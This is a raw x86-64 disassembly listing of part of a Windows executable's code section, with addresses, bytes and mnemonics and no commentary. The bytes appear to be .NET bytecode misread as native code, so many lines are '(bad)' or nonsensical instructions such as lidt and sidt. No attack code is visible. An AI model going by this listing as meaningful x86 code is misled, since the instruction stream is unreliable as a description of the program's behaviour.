   140001f80:	03 4c 0a 06          	add    0x6(%rdx,%rcx,1),%ecx
   140001f84:	21 ff                	and    %edi,%edi
   140001f86:	ff                   	(bad)
   140001f87:	ff                   	(bad)
   140001f88:	ff                   	(bad)
   140001f89:	ff                   	(bad)
   140001f8a:	ff                   	(bad)
   140001f8b:	ff                   	(bad)
   140001f8c:	7f 36                	jg     0x140001fc4
   140001f8e:	05 28 09 00 00       	add    $0x928,%eax
   140001f93:	06                   	(bad)
   140001f94:	06                   	(bad)
   140001f95:	18 6a 5a             	sbb    %ch,0x5a(%rdx)
   140001f98:	28 74 00 00          	sub    %dh,0x0(%rax,%rax,1)
   140001f9c:	06                   	(bad)
   140001f9d:	2a cc                	sub    %ah,%cl
   140001f9f:	cc                   	int3
   140001fa0:	03 30                	add    (%rax),%esi
   140001fa2:	02 00                	add    (%rax),%al
   140001fa4:	29 00                	sub    %eax,(%rax)
   140001fa6:	00 00                	add    %al,(%rax)
   140001fa8:	1a 00                	sbb    (%rax),%al
   140001faa:	00 11                	add    %dl,(%rcx)
   140001fac:	1f                   	(bad)
   140001fad:	58                   	pop    %rax
   140001fae:	6a 28                	push   $0x28
   140001fb0:	74 00                	je     0x140001fb2
   140001fb2:	00 06                	add    %al,(%rsi)
   140001fb4:	0a 06                	or     (%rsi),%al
   140001fb6:	25 55 06 1e 6a       	and    $0x6a1e0655,%eax
   140001fbb:	58                   	pop    %rax
   140001fbc:	06                   	(bad)
   140001fbd:	55                   	push   %rbp
   140001fbe:	06                   	(bad)
   140001fbf:	1f                   	(bad)
   140001fc0:	10 6a 58             	adc    %ch,0x58(%rdx)
   140001fc3:	06                   	(bad)
   140001fc4:	55                   	push   %rbp
   140001fc5:	06                   	(bad)
   140001fc6:	1f                   	(bad)
   140001fc7:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140001fca:	17                   	(bad)
   140001fcb:	52                   	push   %rdx
   140001fcc:	06                   	(bad)
   140001fcd:	1f                   	(bad)
   140001fce:	19 6a 58             	sbb    %ebp,0x58(%rdx)
   140001fd1:	17                   	(bad)
   140001fd2:	52                   	push   %rdx
   140001fd3:	06                   	(bad)
   140001fd4:	2a cc                	sub    %ah,%cl
   140001fd6:	cc                   	int3
   140001fd7:	cc                   	int3
   140001fd8:	03 30                	add    (%rax),%esi
   140001fda:	03 00                	add    (%rax),%eax
   140001fdc:	1a 00                	sbb    (%rax),%al
   140001fde:	00 00                	add    %al,(%rax)
   140001fe0:	1b 00                	sbb    (%rax),%eax
   140001fe2:	00 11                	add    %dl,(%rcx)
   140001fe4:	03 28                	add    (%rax),%ebp
   140001fe6:	74 00                	je     0x140001fe8
   140001fe8:	00 06                	add    %al,(%rsi)
   140001fea:	0a 02                	or     (%rdx),%al
   140001fec:	06                   	(bad)
   140001fed:	55                   	push   %rbp
   140001fee:	02 1e                	add    (%rsi),%bl
   140001ff0:	6a 58                	push   $0x58
   140001ff2:	06                   	(bad)
   140001ff3:	55                   	push   %rbp
   140001ff4:	02 1f                	add    (%rdi),%bl
   140001ff6:	10 6a 58             	adc    %ch,0x58(%rdx)
   140001ff9:	06                   	(bad)
   140001ffa:	03 58 55             	add    0x55(%rax),%ebx
   140001ffd:	2a cc                	sub    %ah,%cl
   140001fff:	cc                   	int3
   140002000:	03 30                	add    (%rax),%esi
   140002002:	03 00                	add    (%rax),%eax
   140002004:	2c 00                	sub    $0x0,%al
   140002006:	00 00                	add    %al,(%rax)
   140002008:	1c 00                	sbb    $0x0,%al
   14000200a:	00 11                	add    %dl,(%rcx)
   14000200c:	02 1f                	add    (%rdi),%bl
   14000200e:	10 6a 58             	adc    %ch,0x58(%rdx)
   140002011:	4c 02 4c 59 1c       	rex.WR add 0x1c(%rcx,%rbx,2),%r9b
   140002016:	63 0a                	movsxd (%rdx),%ecx
   140002018:	02 28                	add    (%rax),%ch
   14000201a:	65 00 00             	add    %al,%gs:(%rax)
   14000201d:	06                   	(bad)
   14000201e:	0d 06 17 64 0c       	or     $0xc641706,%eax
   140002023:	06                   	(bad)
   140002024:	09 08                	or     %ecx,(%rax)
   140002026:	59                   	pop    %rcx
   140002027:	36 02 09             	ss add (%rcx),%cl
   14000202a:	2a 08                	sub    (%rax),%cl
   14000202c:	06                   	(bad)
   14000202d:	58                   	pop    %rax
   14000202e:	0b 07                	or     (%rdi),%eax
   140002030:	03 37                	add    (%rdi),%esi
   140002032:	03 07                	add    (%rdi),%eax
   140002034:	2b 01                	sub    (%rcx),%eax
   140002036:	03 2a                	add    (%rdx),%ebp
   140002038:	03 30                	add    (%rax),%esi
   14000203a:	02 00                	add    (%rax),%al
   14000203c:	0c 00                	or     $0x0,%al
   14000203e:	00 00                	add    %al,(%rax)
   140002040:	00 00                	add    %al,(%rax)
   140002042:	00 00                	add    %al,(%rax)
   140002044:	02 2c 08             	add    (%rax,%rcx,1),%ch
   140002047:	02 03                	add    (%rbx),%al
   140002049:	28 2c 00             	sub    %ch,(%rax,%rax,1)
   14000204c:	00 06                	add    %al,(%rsi)
   14000204e:	26 2a 0b             	es sub (%rbx),%cl
   140002051:	30 03                	xor    %al,(%rbx)
   140002053:	00 6d 00             	add    %ch,0x0(%rbp)
   140002056:	00 00                	add    %al,(%rax)
   140002058:	00 00                	add    %al,(%rax)
   14000205a:	00 00                	add    %al,(%rax)
   14000205c:	02 03                	add    (%rbx),%al
   14000205e:	28 2c 00             	sub    %ch,(%rax,%rax,1)
   140002061:	00 06                	add    %al,(%rsi)
   140002063:	26 02 1f             	es add (%rdi),%bl
   140002066:	20 6a 58             	and    %ch,0x58(%rdx)
   140002069:	03 1f                	add    (%rdi),%ebx
   14000206b:	20 6a 58             	and    %ch,0x58(%rdx)
   14000206e:	4a 54                	rex.WX push %rsp
   140002070:	02 1f                	add    (%rdi),%bl
   140002072:	24 6a                	and    $0x6a,%al
   140002074:	58                   	pop    %rax
   140002075:	03 1f                	add    (%rdi),%ebx
   140002077:	24 6a                	and    $0x6a,%al
   140002079:	58                   	pop    %rax
   14000207a:	4a 54                	rex.WX push %rsp
   14000207c:	02 1f                	add    (%rdi),%bl
   14000207e:	28 6a 58             	sub    %ch,0x58(%rdx)
   140002081:	03 1f                	add    (%rdi),%ebx
   140002083:	28 6a 58             	sub    %ch,0x58(%rdx)
   140002086:	4c 55                	rex.WR push %rbp
   140002088:	02 1f                	add    (%rdi),%bl
   14000208a:	30 6a 58             	xor    %ch,0x58(%rdx)
   14000208d:	03 1f                	add    (%rdi),%ebx
   14000208f:	30 6a 58             	xor    %ch,0x58(%rdx)
   140002092:	4a 54                	rex.WX push %rsp
   140002094:	02 1f                	add    (%rdi),%bl
   140002096:	34 6a                	xor    $0x6a,%al
   140002098:	58                   	pop    %rax
   140002099:	03 1f                	add    (%rdi),%ebx
   14000209b:	34 6a                	xor    $0x6a,%al
   14000209d:	58                   	pop    %rax
   14000209e:	4a 54                	rex.WX push %rsp
   1400020a0:	02 1f                	add    (%rdi),%bl
   1400020a2:	38 6a 58             	cmp    %ch,0x58(%rdx)
   1400020a5:	03 1f                	add    (%rdi),%ebx
   1400020a7:	38 6a 58             	cmp    %ch,0x58(%rdx)
   1400020aa:	4a 54                	rex.WX push %rsp
   1400020ac:	02 1f                	add    (%rdi),%bl
   1400020ae:	3c 6a                	cmp    $0x6a,%al
   1400020b0:	58                   	pop    %rax
   1400020b1:	03 1f                	add    (%rdi),%ebx
   1400020b3:	3c 6a                	cmp    $0x6a,%al
   1400020b5:	58                   	pop    %rax
   1400020b6:	4a 54                	rex.WX push %rsp
   1400020b8:	de 0d fe 06 2b 00    	fimuls 0x2b06fe(%rip)        # 0x1402b27bc
   1400020be:	00 06                	add    %al,(%rsi)
   1400020c0:	02 28                	add    (%rax),%ch
   1400020c2:	7d 00                	jge    0x1400020c4
   1400020c4:	00 06                	add    %al,(%rsi)
   1400020c6:	dc 02                	faddl  (%rdx)
   1400020c8:	2a 00                	sub    (%rax),%al
   1400020ca:	00 00                	add    %al,(%rax)
   1400020cc:	41 1c 00             	rex.B sbb $0x0,%al
   1400020cf:	00 04 00             	add    %al,(%rax,%rax,1)
   1400020d2:	00 00                	add    %al,(%rax)
   1400020d4:	08 00                	or     %al,(%rax)
   1400020d6:	00 00                	add    %al,(%rax)
   1400020d8:	56                   	push   %rsi
   1400020d9:	00 00                	add    %al,(%rax)
   1400020db:	00 5e 00             	add    %bl,0x0(%rsi)
   1400020de:	00 00                	add    %al,(%rax)
   1400020e0:	0d 00 00 00 3b       	or     $0x3b000000,%eax
   1400020e5:	00 00                	add    %al,(%rax)
   1400020e7:	01 0b                	add    %ecx,(%rbx)
   1400020e9:	30 02                	xor    %al,(%rdx)
   1400020eb:	00 70 00             	add    %dh,0x0(%rax)
   1400020ee:	00 00                	add    %al,(%rax)
   1400020f0:	00 00                	add    %al,(%rax)
   1400020f2:	00 00                	add    %al,(%rax)
   1400020f4:	02 03                	add    (%rbx),%al
   1400020f6:	28 2c 00             	sub    %ch,(%rax,%rax,1)
   1400020f9:	00 06                	add    %al,(%rsi)
   1400020fb:	26 02 1f             	es add (%rdi),%bl
   1400020fe:	20 6a 58             	and    %ch,0x58(%rdx)
   140002101:	04 54                	add    $0x54,%al
   140002103:	02 1f                	add    (%rdi),%bl
   140002105:	24 6a                	and    $0x6a,%al
   140002107:	58                   	pop    %rax
   140002108:	16                   	(bad)
   140002109:	54                   	push   %rsp
   14000210a:	02 1f                	add    (%rdi),%bl
   14000210c:	28 6a 58             	sub    %ch,0x58(%rdx)
   14000210f:	16                   	(bad)
   140002110:	6a 55                	push   $0x55
   140002112:	02 1f                	add    (%rdi),%bl
   140002114:	30 6a 58             	xor    %ch,0x58(%rdx)
   140002117:	16                   	(bad)
   140002118:	54                   	push   %rsp
   140002119:	02 1f                	add    (%rdi),%bl
   14000211b:	34 6a                	xor    $0x6a,%al
   14000211d:	58                   	pop    %rax
   14000211e:	16                   	(bad)
   14000211f:	54                   	push   %rsp
   140002120:	02 1f                	add    (%rdi),%bl
   140002122:	38 6a 58             	cmp    %ch,0x58(%rdx)
   140002125:	16                   	(bad)
   140002126:	54                   	push   %rsp
   140002127:	02 1f                	add    (%rdi),%bl
   140002129:	3c 6a                	cmp    $0x6a,%al
   14000212b:	58                   	pop    %rax
   14000212c:	16                   	(bad)
   14000212d:	54                   	push   %rsp
   14000212e:	de 0d fe 06 2b 00    	fimuls 0x2b06fe(%rip)        # 0x1402b2832
   140002134:	00 06                	add    %al,(%rsi)
   140002136:	02 28                	add    (%rax),%ch
   140002138:	7d 00                	jge    0x14000213a
   14000213a:	00 06                	add    %al,(%rsi)
   14000213c:	dc de                	(bad)
   14000213e:	0d fe 06 2b 00       	or     $0x2b06fe,%eax
   140002143:	00 06                	add    %al,(%rsi)
   140002145:	03 28                	add    (%rax),%ebp
   140002147:	7d 00                	jge    0x140002149
   140002149:	00 06                	add    %al,(%rsi)
   14000214b:	dc 00                	faddl  (%rax)
   14000214d:	03 28                	add    (%rax),%ebp
   14000214f:	3c 00                	cmp    $0x0,%al
   140002151:	00 06                	add    %al,(%rsi)
   140002153:	de 0d fe 06 2e 00    	fimuls 0x2e06fe(%rip)        # 0x1402e2857
   140002159:	00 06                	add    %al,(%rsi)
   14000215b:	03 28                	add    (%rax),%ebp
   14000215d:	7d 00                	jge    0x14000215f
   14000215f:	00 06                	add    %al,(%rsi)
   140002161:	dc 02                	faddl  (%rdx)
   140002163:	2a 41 4c             	sub    0x4c(%rcx),%al
   140002166:	00 00                	add    %al,(%rax)
   140002168:	04 00                	add    $0x0,%al
   14000216a:	00 00                	add    %al,(%rax)
   14000216c:	08 00                	or     %al,(%rax)
   14000216e:	00 00                	add    %al,(%rax)
   140002170:	34 00                	xor    $0x0,%al
   140002172:	00 00                	add    %al,(%rax)
   140002174:	3c 00                	cmp    $0x0,%al
   140002176:	00 00                	add    %al,(%rax)
   140002178:	0d 00 00 00 3b       	or     $0x3b000000,%eax
   14000217d:	00 00                	add    %al,(%rax)
   14000217f:	01 04 00             	add    %eax,(%rax,%rax,1)
   140002182:	00 00                	add    %al,(%rax)
   140002184:	00 00                	add    %al,(%rax)
   140002186:	00 00                	add    %al,(%rax)
   140002188:	4b 00 00             	rex.WXB add %al,(%r8)
   14000218b:	00 4b 00             	add    %cl,0x0(%rbx)
   14000218e:	00 00                	add    %al,(%rax)
   140002190:	0d 00 00 00 3b       	or     $0x3b000000,%eax
   140002195:	00 00                	add    %al,(%rax)
   140002197:	01 04 00             	add    %eax,(%rax,%rax,1)
   14000219a:	00 00                	add    %al,(%rax)
   14000219c:	59                   	pop    %rcx
   14000219d:	00 00                	add    %al,(%rax)
   14000219f:	00 08                	add    %cl,(%rax)
   1400021a1:	00 00                	add    %al,(%rax)
   1400021a3:	00 61 00             	add    %ah,0x0(%rcx)
   1400021a6:	00 00                	add    %al,(%rax)
   1400021a8:	0d 00 00 00 3b       	or     $0x3b000000,%eax
   1400021ad:	00 00                	add    %al,(%rax)
   1400021af:	01 03                	add    %eax,(%rbx)
   1400021b1:	30 02                	xor    %al,(%rdx)
   1400021b3:	00 09                	add    %cl,(%rcx)
   1400021b5:	00 00                	add    %al,(%rax)
   1400021b7:	00 00                	add    %al,(%rax)
   1400021b9:	00 00                	add    %al,(%rax)
   1400021bb:	00 02                	add    %al,(%rdx)
   1400021bd:	25 28 5c 00 00       	and    $0x5c28,%eax
   1400021c2:	06                   	(bad)
   1400021c3:	55                   	push   %rbp
   1400021c4:	2a cc                	sub    %ah,%cl
   1400021c6:	cc                   	int3
   1400021c7:	cc                   	int3
   1400021c8:	0b 30                	or     (%rax),%esi
   1400021ca:	02 00                	add    (%rax),%al
   1400021cc:	3f                   	(bad)
   1400021cd:	00 00                	add    %al,(%rax)
   1400021cf:	00 00                	add    %al,(%rax)
   1400021d1:	00 00                	add    %al,(%rax)
   1400021d3:	00 02                	add    %al,(%rdx)
   1400021d5:	1f                   	(bad)
   1400021d6:	20 6a 58             	and    %ch,0x58(%rdx)
   1400021d9:	28 75 00             	sub    %dh,0x0(%rbp)
   1400021dc:	00 06                	add    %al,(%rsi)
   1400021de:	de 0d fe 06 2b 00    	fimuls 0x2b06fe(%rip)        # 0x1402b28e2
   1400021e4:	00 06                	add    %al,(%rsi)
   1400021e6:	02 28                	add    (%rax),%ch
   1400021e8:	7d 00                	jge    0x1400021ea
   1400021ea:	00 06                	add    %al,(%rsi)
   1400021ec:	dc 00                	faddl  (%rax)
   1400021ee:	02 28                	add    (%rax),%ch
   1400021f0:	3c 00                	cmp    $0x0,%al
   1400021f2:	00 06                	add    %al,(%rsi)
   1400021f4:	de 0d fe 06 2e 00    	fimuls 0x2e06fe(%rip)        # 0x1402e28f8
   1400021fa:	00 06                	add    %al,(%rsi)
   1400021fc:	02 28                	add    (%rax),%ch
   1400021fe:	7d 00                	jge    0x140002200
   140002200:	00 06                	add    %al,(%rsi)
   140002202:	dc 03                	faddl  (%rbx)
   140002204:	17                   	(bad)
   140002205:	5f                   	pop    %rdi
   140002206:	2c 09                	sub    $0x9,%al
   140002208:	02 1f                	add    (%rdi),%bl
   14000220a:	38 6a 28             	cmp    %ch,0x28(%rdx)
   14000220d:	da 00                	fiaddl (%rax)
   14000220f:	00 06                	add    %al,(%rsi)
   140002211:	02 2a                	add    (%rdx),%ch
   140002213:	00 41 34             	add    %al,0x34(%rcx)
   140002216:	00 00                	add    %al,(%rax)
   140002218:	04 00                	add    $0x0,%al
   14000221a:	00 00                	add    %al,(%rax)
   14000221c:	00 00                	add    %al,(%rax)
   14000221e:	00 00                	add    %al,(%rax)
   140002220:	0c 00                	or     $0x0,%al
   140002222:	00 00                	add    %al,(%rax)
   140002224:	0c 00                	or     $0x0,%al
   140002226:	00 00                	add    %al,(%rax)
   140002228:	0d 00 00 00 3b       	or     $0x3b000000,%eax
   14000222d:	00 00                	add    %al,(%rax)
   14000222f:	01 04 00             	add    %eax,(%rax,%rax,1)
   140002232:	00 00                	add    %al,(%rax)
   140002234:	1a 00                	sbb    (%rax),%al
   140002236:	00 00                	add    %al,(%rax)
   140002238:	08 00                	or     %al,(%rax)
   14000223a:	00 00                	add    %al,(%rax)
   14000223c:	22 00                	and    (%rax),%al
   14000223e:	00 00                	add    %al,(%rax)
   140002240:	0d 00 00 00 3b       	or     $0x3b000000,%eax
   140002245:	00 00                	add    %al,(%rax)
   140002247:	01 03                	add    %eax,(%rbx)
   140002249:	30 04 00             	xor    %al,(%rax,%rax,1)
   14000224c:	70 00                	jo     0x14000224e
   14000224e:	00 00                	add    %al,(%rax)
   140002250:	1d 00 00 11 04       	sbb    $0x4110000,%eax
   140002255:	02 28                	add    (%rax),%ch
   140002257:	52                   	push   %rdx
   140002258:	00 00                	add    %al,(%rax)
   14000225a:	06                   	(bad)
   14000225b:	36 05 28 0b 00 00    	ss add $0xb28,%eax
   140002261:	06                   	(bad)
   140002262:	04 1d                	add    $0x1d,%al
   140002264:	6a 35                	push   $0x35
   140002266:	1c 02                	sbb    $0x2,%al
   140002268:	1f                   	(bad)
   140002269:	10 6a 58             	adc    %ch,0x58(%rdx)
   14000226c:	04 55                	add    $0x55,%al
   14000226e:	02 1f                	add    (%rdi),%bl
   140002270:	18 6a 58             	sbb    %ch,0x58(%rdx)
   140002273:	1d 6a 55 02 03       	sbb    $0x302556a,%eax
   140002278:	1f                   	(bad)
   140002279:	10 6a 28             	adc    %ch,0x28(%rdx)
   14000227c:	e5 00                	in     $0x0,%eax
   14000227e:	00 06                	add    %al,(%rsi)
   140002280:	26 2b 40 04          	es sub 0x4(%rax),%eax
   140002284:	1d 6a 02 28 52       	sbb    $0x5228026a,%eax
   140002289:	00 00                	add    %al,(%rax)
   14000228b:	06                   	(bad)
   14000228c:	28 51 00             	sub    %dl,0x0(%rcx)
   14000228f:	00 06                	add    %al,(%rsi)
   140002291:	17                   	(bad)
   140002292:	6a 58                	push   $0x58
   140002294:	0a 02                	or     (%rdx),%al
   140002296:	12 00                	adc    (%rax),%al
   140002298:	28 5b 00             	sub    %bl,0x0(%rbx)
   14000229b:	00 06                	add    %al,(%rsi)
   14000229d:	0b 06                	or     (%rsi),%eax
   14000229f:	17                   	(bad)
   1400022a0:	6a 59                	push   $0x59
   1400022a2:	0a 02                	or     (%rdx),%al
   1400022a4:	07                   	(bad)
   1400022a5:	55                   	push   %rbp
   1400022a6:	02 1f                	add    (%rdi),%bl
   1400022a8:	10 6a 58             	adc    %ch,0x58(%rdx)
   1400022ab:	04 55                	add    $0x55,%al
   1400022ad:	02 1f                	add    (%rdi),%bl
   1400022af:	18 6a 58             	sbb    %ch,0x58(%rdx)
   1400022b2:	06                   	(bad)
   1400022b3:	55                   	push   %rbp
   1400022b4:	07                   	(bad)
   1400022b5:	03 04 17             	add    (%rdi,%rdx,1),%eax
   1400022b8:	6a 58                	push   $0x58
   1400022ba:	18 6a 5a             	sbb    %ch,0x5a(%rdx)
   1400022bd:	28 e5                	sub    %ah,%ch
   1400022bf:	00 00                	add    %al,(%rax)
   1400022c1:	06                   	(bad)
   1400022c2:	26 2a 0b             	es sub (%rbx),%cl
   1400022c5:	30 05 00 43 00 00    	xor    %al,0x4300(%rip)        # 0x1400065cb
   1400022cb:	00 1e                	add    %bl,(%rsi)
   1400022cd:	00 00                	add    %al,(%rax)
   1400022cf:	11 03                	adc    %eax,(%rbx)
   1400022d1:	2c 3f                	sub    $0x3f,%al
   1400022d3:	03 02                	add    (%rdx),%eax
   1400022d5:	28 60 00             	sub    %ah,0x0(%rax)
   1400022d8:	00 06                	add    %al,(%rsi)
   1400022da:	36 05 28 5e 00 00    	ss add $0x5e28,%eax
   1400022e0:	06                   	(bad)
   1400022e1:	02 03                	add    (%rbx),%al
   1400022e3:	28 5f 00             	sub    %bl,0x0(%rdi)
   1400022e6:	00 06                	add    %al,(%rsi)
   1400022e8:	12 00                	adc    (%rax),%al
   1400022ea:	02 55 02             	add    0x2(%rbp),%dl
   1400022ed:	1e                   	(bad)
   1400022ee:	6a 58                	push   $0x58
   1400022f0:	04 4c                	add    $0x4c,%al
   1400022f2:	05 4c 02 4c 02       	add    $0x24c024c,%eax
   1400022f7:	28 44 00 00          	sub    %al,0x0(%rax,%rax,1)
   1400022fb:	06                   	(bad)
   1400022fc:	55                   	push   %rbp
   1400022fd:	12 00                	adc    (%rax),%al
   1400022ff:	16                   	(bad)
   140002300:	6a 55                	push   $0x55
   140002302:	de 0e                	fimuls (%rsi)
   140002304:	fe 06                	incb   (%rsi)
   140002306:	4c 00 00             	rex.WR add %r8b,(%rax)
   140002309:	06                   	(bad)
   14000230a:	12 00                	adc    (%rax),%al
   14000230c:	28 7d 00             	sub    %bh,0x0(%rbp)
   14000230f:	00 06                	add    %al,(%rsi)
   140002311:	dc 2a                	fsubrl (%rdx)
   140002313:	00 41 1c             	add    %al,0x1c(%rcx)
   140002316:	00 00                	add    %al,(%rax)
   140002318:	04 00                	add    $0x0,%al
   14000231a:	00 00                	add    %al,(%rax)
   14000231c:	1c 00                	sbb    $0x0,%al
   14000231e:	00 00                	add    %al,(%rax)
   140002320:	18 00                	sbb    %al,(%rax)
   140002322:	00 00                	add    %al,(%rax)
   140002324:	34 00                	xor    $0x0,%al
   140002326:	00 00                	add    %al,(%rax)
   140002328:	0e                   	(bad)
   140002329:	00 00                	add    %al,(%rax)
   14000232b:	00 3b                	add    %bh,(%rbx)
   14000232d:	00 00                	add    %al,(%rax)
   14000232f:	01 03                	add    %eax,(%rbx)
   140002331:	30 03                	xor    %al,(%rbx)
   140002333:	00 7c 00 00          	add    %bh,0x0(%rax,%rax,1)
   140002337:	00 1f                	add    %bl,(%rdi)
   140002339:	00 00                	add    %al,(%rax)
   14000233b:	11 04 02             	adc    %eax,(%rdx,%rax,1)
   14000233e:	28 52 00             	sub    %dl,0x0(%rdx)
   140002341:	00 06                	add    %al,(%rsi)
   140002343:	36 05 28 0b 00 00    	ss add $0xb28,%eax
   140002349:	06                   	(bad)
   14000234a:	04 1d                	add    $0x1d,%al
   14000234c:	6a 35                	push   $0x35
   14000234e:	24 02                	and    $0x2,%al
   140002350:	1f                   	(bad)
   140002351:	10 6a 58             	adc    %ch,0x58(%rdx)
   140002354:	04 55                	add    $0x55,%al
   140002356:	02 1f                	add    (%rdi),%bl
   140002358:	18 6a 58             	sbb    %ch,0x58(%rdx)
   14000235b:	1d 6a 55 04 18       	sbb    $0x1804556a,%eax
   140002360:	6a 5a                	push   $0x5a
   140002362:	0a 02                	or     (%rdx),%al
   140002364:	03 06                	add    (%rsi),%eax
   140002366:	28 e5                	sub    %ah,%ch
   140002368:	00 00                	add    %al,(%rax)
   14000236a:	06                   	(bad)
   14000236b:	26 06                	es (bad)
   14000236d:	02 58 16             	add    0x16(%rax),%bl
   140002370:	53                   	push   %rbx
   140002371:	2b 44 04 1d          	sub    0x1d(%rsp,%rax,1),%eax
   140002375:	6a 02                	push   $0x2
   140002377:	28 52 00             	sub    %dl,0x0(%rdx)
   14000237a:	00 06                	add    %al,(%rsi)
   14000237c:	28 51 00             	sub    %dl,0x0(%rcx)
   14000237f:	00 06                	add    %al,(%rsi)
   140002381:	17                   	(bad)
   140002382:	6a 58                	push   $0x58
   140002384:	0c 02                	or     $0x2,%al
   140002386:	12 02                	adc    (%rdx),%al
   140002388:	28 5b 00             	sub    %bl,0x0(%rbx)
   14000238b:	00 06                	add    %al,(%rsi)
   14000238d:	0b 08                	or     (%rax),%ecx
   14000238f:	17                   	(bad)
   140002390:	6a 59                	push   $0x59
   140002392:	0c 02                	or     $0x2,%al
   140002394:	07                   	(bad)
   140002395:	55                   	push   %rbp
   140002396:	02 1f                	add    (%rdi),%bl
   140002398:	10 6a 58             	adc    %ch,0x58(%rdx)
   14000239b:	04 55                	add    $0x55,%al
   14000239d:	02 1f                	add    (%rdi),%bl
   14000239f:	18 6a 58             	sbb    %ch,0x58(%rdx)
   1400023a2:	08 55 04             	or     %dl,0x4(%rbp)
   1400023a5:	18 6a 5a             	sbb    %ch,0x5a(%rdx)
   1400023a8:	0a 07                	or     (%rdi),%al
   1400023aa:	03 06                	add    (%rsi),%eax
   1400023ac:	28 e5                	sub    %ah,%ch
   1400023ae:	00 00                	add    %al,(%rax)
   1400023b0:	06                   	(bad)
   1400023b1:	26 06                	es (bad)
   1400023b3:	07                   	(bad)
   1400023b4:	58                   	pop    %rax
   1400023b5:	16                   	(bad)
   1400023b6:	53                   	push   %rbx
   1400023b7:	2a 03                	sub    (%rbx),%al
   1400023b9:	30 02                	xor    %al,(%rdx)
   1400023bb:	00 15 00 00 00 20    	add    %dl,0x20000000(%rip)        # 0x1600023c1
   1400023c1:	00 00                	add    %al,(%rax)
   1400023c3:	11 07                	adc    %eax,(%rdi)
   1400023c5:	0a 02                	or     (%rdx),%al
   1400023c7:	16                   	(bad)
   1400023c8:	6a 55                	push   $0x55
   1400023ca:	02 1e                	add    (%rsi),%bl
   1400023cc:	6a 58                	push   $0x58
   1400023ce:	16                   	(bad)
   1400023cf:	6a 55                	push   $0x55
   1400023d1:	02 28                	add    (%rax),%ch
   1400023d3:	4e 00 00             	rex.WRX add %r8b,(%rax)
   1400023d6:	06                   	(bad)
   1400023d7:	02 2a                	add    (%rdx),%ch
   1400023d9:	cc                   	int3
   1400023da:	cc                   	int3
   1400023db:	cc                   	int3
   1400023dc:	03 30                	add    (%rax),%esi
   1400023de:	03 00                	add    (%rax),%eax
   1400023e0:	1b 00                	sbb    (%rax),%eax
   1400023e2:	00 00                	add    %al,(%rax)
   1400023e4:	00 00                	add    %al,(%rax)
   1400023e6:	00 00                	add    %al,(%rax)
   1400023e8:	02 1e                	add    (%rsi),%bl
   1400023ea:	6a 58                	push   $0x58
   1400023ec:	4c 03 28             	add    (%rax),%r13
   1400023ef:	77 00                	ja     0x1400023f1
   1400023f1:	00 06                	add    %al,(%rsi)
   1400023f3:	26 02 1e             	es add (%rsi),%bl
   1400023f6:	6a 58                	push   $0x58
   1400023f8:	02 1e                	add    (%rsi),%bl
   1400023fa:	6a 58                	push   $0x58
   1400023fc:	4c 1f                	rex.WR (bad)
   1400023fe:	40 6a 58             	rex push $0x58
   140002401:	55                   	push   %rbp
   140002402:	2a cc                	sub    %ah,%cl
   140002404:	0b 30                	or     (%rax),%esi
   140002406:	03 00                	add    (%rax),%eax
   140002408:	2c 00                	sub    $0x0,%al
   14000240a:	00 00                	add    %al,(%rax)
   14000240c:	18 00                	sbb    %al,(%rax)
   14000240e:	00 11                	add    %dl,(%rcx)
   140002410:	02 28                	add    (%rax),%ch
   140002412:	50                   	push   %rax
   140002413:	00 00                	add    %al,(%rax)
   140002415:	06                   	(bad)
   140002416:	26 03 1f             	es add (%rdi),%ebx
   140002419:	10 6a 58             	adc    %ch,0x58(%rdx)
   14000241c:	4c 0a 02             	rex.WR or (%rdx),%r8b
   14000241f:	03 28                	add    (%rax),%ebp
   140002421:	3b 00                	cmp    (%rax),%eax
   140002423:	00 06                	add    %al,(%rsi)
   140002425:	06                   	(bad)
   140002426:	28 7b 00             	sub    %bh,0x0(%rbx)
   140002429:	00 06                	add    %al,(%rsi)
   14000242b:	de 0d fe 06 2e 00    	fimuls 0x2e06fe(%rip)        # 0x1402e2b2f
   140002431:	00 06                	add    %al,(%rsi)
   140002433:	02 28                	add    (%rax),%ch
   140002435:	7d 00                	jge    0x140002437
   140002437:	00 06                	add    %al,(%rsi)
   140002439:	dc 02                	faddl  (%rdx)
   14000243b:	2a 41 1c             	sub    0x1c(%rcx),%al
   14000243e:	00 00                	add    %al,(%rax)
   140002440:	04 00                	add    $0x0,%al
   140002442:	00 00                	add    %al,(%rax)
   140002444:	07                   	(bad)
   140002445:	00 00                	add    %al,(%rax)
   140002447:	00 16                	add    %dl,(%rsi)
   140002449:	00 00                	add    %al,(%rax)
   14000244b:	00 1d 00 00 00 0d    	add    %bl,0xd000000(%rip)        # 0x14d002451
   140002451:	00 00                	add    %al,(%rax)
   140002453:	00 3b                	add    %bh,(%rbx)
   140002455:	00 00                	add    %al,(%rax)
   140002457:	01 03                	add    %eax,(%rbx)
   140002459:	30 04 00             	xor    %al,(%rax,%rax,1)
   14000245c:	32 00                	xor    (%rax),%al
   14000245e:	00 00                	add    %al,(%rax)
   140002460:	21 00                	and    %eax,(%rax)
   140002462:	00 11                	add    %dl,(%rcx)
   140002464:	02 16                	add    (%rsi),%dl
   140002466:	6a 55                	push   $0x55
   140002468:	02 1e                	add    (%rsi),%bl
   14000246a:	6a 58                	push   $0x58
   14000246c:	16                   	(bad)
   14000246d:	6a 55                	push   $0x55
   14000246f:	02 1f                	add    (%rdi),%bl
   140002471:	10 6a 58             	adc    %ch,0x58(%rdx)
   140002474:	16                   	(bad)
   140002475:	6a 55                	push   $0x55
   140002477:	0f 01 1e             	lidt   (%rsi)
   14000247a:	58                   	pop    %rax
   14000247b:	4c 0b 0f             	or     (%rdi),%r9
   14000247e:	01 4c 0a 02          	add    %ecx,0x2(%rdx,%rcx,1)
   140002482:	0f 01 1e             	lidt   (%rsi)
   140002485:	58                   	pop    %rax
   140002486:	4c 0f 01 4c 59 12    	rex.WR sidt 0x12(%rcx,%rbx,2)
   14000248c:	00 12                	add    %dl,(%rdx)
   14000248e:	01 28                	add    %ebp,(%rax)
   140002490:	32 00                	xor    (%rax),%al
   140002492:	00 06                	add    %al,(%rsi)
   140002494:	02 2a                	add    (%rdx),%ch
   140002496:	cc                   	int3
   140002497:	cc                   	int3
   140002498:	0b 30                	or     (%rax),%esi
   14000249a:	03 00                	add    (%rax),%eax
   14000249c:	27                   	(bad)
   14000249d:	00 00                	add    %al,(%rax)
   14000249f:	00 18                	add    %bl,(%rax)
   1400024a1:	00 00                	add    %al,(%rax)
   1400024a3:	11 02                	adc    %eax,(%rdx)
